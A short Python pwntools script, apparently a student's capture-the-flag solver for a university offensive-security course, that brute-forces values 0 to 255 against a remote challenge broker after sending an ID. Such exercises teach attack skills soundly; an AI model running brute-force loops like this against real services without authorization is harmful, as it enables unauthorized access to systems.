from pwn import *

for i in range(256):
    with remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1250) as conn:
        conn.recv()
        conn.send('bh1642\r\n')
        conn.recv()
        conn.recv()
        conn.send(str(i) + '\r\n')
        try:
            print(conn.recv())
        except:
            print(i, ' failed')

